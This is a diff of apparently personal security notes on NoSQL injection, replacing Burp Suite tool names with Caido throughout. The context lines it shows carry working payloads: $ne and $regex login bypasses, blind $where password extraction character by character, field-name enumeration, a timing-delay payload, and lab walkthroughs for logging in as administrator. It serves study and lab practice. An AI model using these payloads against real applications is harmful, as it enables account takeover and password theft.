@@ -186,7 +186,7 @@ Binary-search the boundary — when the response switches from success to failur
 admin' && this.password[0] == 'a' || 'a'=='b
 admin' && this.password[0] == 'b' || 'a'=='b
 ```
-Repeat for each position 0–N. Automate with Burp Intruder (Cluster Bomb): payload 1 = position (0–N), payload 2 = character set (a–z, A–Z, 0–9).
+Repeat for each position 0–N. Automate with Caido Automate (Cluster Bomb): payload 1 = position (0–N), payload 2 = character set (a–z, A–Z, 0–9).
 
 **Alternative: `match()` with regex pattern:**
 ```
@@ -202,7 +202,7 @@ When the application has operator injection with `$where` support, discover hidd
 {"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[0].match('^.{0}i.*')"}
 ```
 
-Template for Burp Intruder (Cluster Bomb):
+Template for Caido Automate (Cluster Bomb):
 - Payload position 1: `{§§}` — integer 0–20 (character position)
 - Payload position 2: `§§` — character set a–z, A–Z, 0–9
 
@@ -297,7 +297,7 @@ admin' && this.password[1] == 'b' || 'a'=='b
 {"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[0].match('^.{0}i.*')"}
 ```
 
-Burp Intruder Cluster Bomb template (enumerate field name at array index N):
+Caido Automate Cluster Bomb template (enumerate field name at array index N):
 ```
 "$where":"Object.keys(this)[§N§].match('^.{§POS§}§CHAR§.*')"
 ```
@@ -361,7 +361,7 @@ admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x
 
 ## Tools
 
-- [[burp-suite]] — intercept and modify POST body; switch between URL-encoded and JSON content types
+- [[caido]] — intercept and modify POST body; switch between URL-encoded and JSON content types
 - `curl` for quick operator injection tests:
 
 ```bash
@@ -381,7 +381,7 @@ curl -X POST http://target/login \
 
 Goal: confirm injection in a `category` GET parameter and display unreleased products.
 
-1. In Burp Repeater, inject `'` (URL-encoded `%27`) into the `category` parameter — observe a syntax error response.
+1. In Caido Replay, inject `'` (URL-encoded `%27`) into the `category` parameter — observe a syntax error response.
 2. Inject `'+'` (`%27%2B%27`) — no error, confirms the quote was breaking the query.
 3. Boolean false: `' && 0 && 'x` (`%27%20%26%26%200%20%26%26%20%27x`) — no results (condition false).
 4. Boolean true: `' && 1 && 'x` (`%27%20%26%26%201%20%26%26%20%27x`) — normal results (condition true).
@@ -398,7 +398,7 @@ GET /product/lookup?category='%20%7C%7C%201%20%7C%7C%20'
 
 Goal: log in as `administrator` without knowing the password.
 
-1. Intercept the JSON login request in Burp Suite.
+1. Intercept the JSON login request in Caido.
 2. Confirm operator injection with a known account:
 ```json
 {"username":{"$regex":"wie.*"},"password":{"$ne":""}}
@@ -433,7 +433,7 @@ Goal: extract the `administrator` account password via blind `$where` injection 
 administrator' && this.password.length < 30 || 'a'=='b
 administrator' && this.password.length < 6  || 'a'=='b
 ```
-6. Extract each character using index access (Burp Intruder Cluster Bomb):
+6. Extract each character using index access (Caido Automate Cluster Bomb):
 ```
 administrator' && this.password[§POS§]=='§CHAR§' || 'a'=='b
 ```
